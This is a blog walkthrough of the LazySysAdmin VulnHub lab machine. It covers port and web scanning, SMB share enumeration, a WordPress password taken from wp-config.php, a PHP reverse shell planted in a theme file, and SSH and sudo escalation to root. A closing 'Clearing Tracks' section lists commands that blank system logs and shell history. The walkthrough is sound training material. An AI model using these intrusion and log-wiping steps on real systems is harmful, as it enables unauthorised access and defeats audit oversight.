---
layout: post
title:  "LazySysAdmin Writeup"
date:   2017-12-25 16:54:07 +0800
categories: jekyll update
---

Well. What better way to spend christmas than solving a VulbHub machine? This VM is built for beginner/intermediate difficulty level. Link to [LazySysAdmin][lazysysadmin] on VulnHub.

I spent about two days on this, even though it could be done within three hours. So here is my writeup.

Of course, assuming download and import is done, lets examine this machine. I am using Kali Linux, but Ubuntu will be fine in my opinion. (Install what you need right?)

## Scanning
---
Since this is a VM challenge, my first instinct was to do scanning.

Ping Scan:
nmap -sn [network address]
![pingscan]

Once IP was found, lets do a port scan:
nmap [target ip]
![normalscan]
```sh
Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-25 04:37 EST
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
6667/tcp open  irc
MAC Address: 08:00:27:6F:9E:3B (Oracle VirtualBox virtual NIC)
```

\
Interesting... Lets have a comprehensive scan for more information:
nmap -A [target ip]
```sh
Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-25 04:37 EST
Nmap scan report for 192.168.56.101
Host is up (0.00037s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Silex v2.2.7
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.56.102
|_  error: Closing link: (nmap@192.168.56.102) [Client exited]
MAC Address: 08:00:27:6F:9E:3B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h59m54s, deviation: 0s, median: 7h59m54s
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2017-12-26T03:38:09+10:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2017-12-25 12:38:09
|_  start_date: 1600-12-31 19:03:58

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.56.101
```

## Enumeration
---
Knowing that Port 80 is open, without opening the web browser yet, lets use `nikto`.


`nikto -host http://192.168.56.101`

```sh
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        80
+ Start Time:         2017-12-25 04:41:09 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x8ce8 0x5560ea23d23c0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /old/: Directory indexing found.
+ Entry '/old/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /test/: Directory indexing found.
+ Entry '/test/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /Backnode_files/: Directory indexing found.
+ Entry '/Backnode_files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 4 entries which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /apache/: Directory indexing found.
+ OSVDB-3092: /apache/: This might be interesting...
+ OSVDB-3092: /old/: This might be interesting...
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22
+ Uncommon header 'x-ob_mode' found, with contents: 0
+ OSVDB-3092: /test/: This might be interesting...
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ Uncommon header 'link' found, with contents: <http://192.168.56.101/wordpress/index.php?rest_route=/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7690 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2017-12-25 04:41:39 (GMT-5) (30 seconds)
---------------------------------------------------------------------------
```

`nikto` presented many useful information, but what caught my attention was `robots.txt` and `/wordpress`.
So, was there a wordpress installation? Upon viewing http://192.168.56.101/wordpress, a wordpress page was presented. 

![wphome]

If the defaults weren't changed, http://192.168.56.101/wordpress/wp-login will take me to the login page, and yes it is the login page. 

With the knowledge of the website having a default path for the login page, the next step is to enumerate users on wordpress.
Using `wpscan`, we will be able to perform enumeration on wordpress apps.

`wpscan --url http://192.168.56.101/wordpress/ --enumerate u`

With the following output:
```sh
--output trimmed--
[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-------+---------+
    | Id | Login | Name    |
    +----+-------+---------+
    | 1  | admin | Admin – |
    +----+-------+---------+
[!] Default first WordPress username 'admin' is still used
```

Lesson: NEVER keep the default admin. =)

## Gaining Access
---
So of course, the first thing to try for login is "username: admin ,password: admin". Well of course it didn't work. So I went on to try brute force attack instead. Well... Don't bother trying if you are thinking about it. =)

I had to look somewhere else.. The system isn't just about the web application. It is just one of the vectors of entry. Looking back at the port scan, one particular port number stood out: `445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)`. Yeap, `samba` was available. But in what way was it vulerable? The first thing I tried was using ***metasploit framework*** to take advantage of known CVE, but that didn't work. So it was yet another brick wall. After slacking off for about an hour, the word *enumeration* came to my head. I went ahead googling ***samba enumeration for metasploit*** (well I was kinda lazy to do it the non msfconsole way). This link helped me: [SAMBA ENUMERATION][smbenum].

After running the enumeration, I was given the following output.
```sh
--output trimmed--
[+] 192.168.56.101:139    - print$ - (DS) Printer Drivers
[+] 192.168.56.101:139    - share$ - (DS) Sumshare
[+] 192.168.56.101:139    - IPC$ - (I) IPC Service (Web server)
```

Lets try `\\192.168.56.101\share$` using windows explorer..

Which gave me the following files!

![smbdir]

Apparently, this is the root directory of the web server!

Since the wordpress was installed at http://192.168.56/101/wordpress/, the folder `wordpress` would be the first place to look at. The very first thing to look for in a wordpress installation is always `wp-config.php`. Upon opening `wp-config.php`, I was able able to locate the password for the user `admin`. Which turns out to be, `TogieMYSQL12345^^`.

With the credentials, I am able to login via the http://192.168.56.101/wordpress/wp-admin page. All that was left for gaining access was to insert a simple php reverse shell. This can be done by making some edits to the `footer.php`  file, which is located under *"Appearance --> Editor"*. Since I am using Kali Linux, a template of the php reverse shell can be found at `/usr/share/webshells/php/php-reverse-shell.php`. After inserting the reverse shell code and saving the changes, I need to set up a listener. A simple netcat listener will do. 

For my php reverse shell codes, I configured the port to 4444. At my Kali Machine, I set up the listener with the following command: `nc -nlvp 4444`. Once the listener is running, I proceed to refresh the the wordpress home page. The page will 'hang', but looking back at my terminal where my netcat was running on, I have successfully gained shell access. 


## Priviledge Escalation
---
So since I have gained shell access, it was time to do priviledge escalation. Dirty c0w was last resort, so I went on checking if `nmap` was installed, because `nmap` has an interactive mode where commands can be used as root (No luck eventually). I also went on checking `/etc/passwd` to check out which other users exist on the system. The same can be done when I did `ls /home`. A particular user `togie` was on the system.

Looking back at the \\192.168.56.101\share$, there was an interesting text file called "deets.txt". Insider it states: "CBF Remembering all these passwords. Remember to remove this file and update your password after we push out the server. Password 12345"

Does that mean the password is "12345"?
Well SSH was availble and I tried.
```sh
Using username "togie".
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         #
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   #
##################################################################################################

togie@192.168.56.101's password:
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

 System information disabled due to load higher than 1.0

133 packages can be updated.
0 updates are security updates.

togie@LazySysAdmin:~$
```

Terrific, I am in as a normal user through SSH! (Abandons php reverse shell)
With no luck on `nmap` installation, I proceed to double confirm the OS type with "uname -a".
`Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux`
Hmmm..... Ubuntu?
I went on with the command "groups" to check out which groups "togie" belongs to.
`togie adm cdrom sudo dip plugdev lpadmin sambashare`
Well it appears that togie is part of the group sudo!

So I tried `sudo -i`, and proceeded to enter 'togie' password.
*Priviledge Escalated*

Well this appears to be the most "straight forward" escalation, as it was intended. Nothing sophisticated was needed. Last but not least, the following commands to check for user, current working directory and list files. `whoami;pwd;ls -la`

OUTPUT:
```sh
root
/root
total 28
drwx------  3 root root 4096 Aug 15 23:10 .
drwxr-xr-x 22 root root 4096 Aug 21 20:10 ..
-rw-------  1 root root 1136 Dec 25 19:02 .bash_history
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
drwx------  2 root root 4096 Aug 14 20:30 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root  347 Aug 21 19:35 proof.txt
```

Finally, `cat proof.txt`

```
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
```

## Clearing Tracks
---

Well... If this was a real scenario, you would not want to leave bread crumbs behind. 

Since you are root, you can do whatever you want as root.
So the following commands should clear most of your tracks..
```sh
echo ' ' > /var/log/syslog
echo ' ' > /var/log/auth.log
echo ' ' > /var/log/inspircd.log
echo ' ' > /var/log/apache2/access.log
echo ' ' > /var/log/apache2/error.log
echo ' ' > /var/log/mysql/error.log
echo ' ' > /var/log/mysql.err
echo ' ' > /var/log/mysql.log
echo ' ' > /var/log/samba/log.[Attacker machine IP Address]
echo ' ' > /var/log/wtmp
rm .bash_history
history -c
```

## The End
---
And that's it! Successfully found the treasure! (which is proof.txt)



[lazysysadmin]: https://www.vulnhub.com/entry/lazysysadmin-1,205/
[smbenum]: https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_enumshares
[normalscan]: https://i.imgur.com/ma90k0e.png
[pingscan]: https://i.imgur.com/l9VoGJK.png
[smbdir]: https://i.imgur.com/Wd06UeM.png
[wphome]: https://i.imgur.com/nzT6JBN.png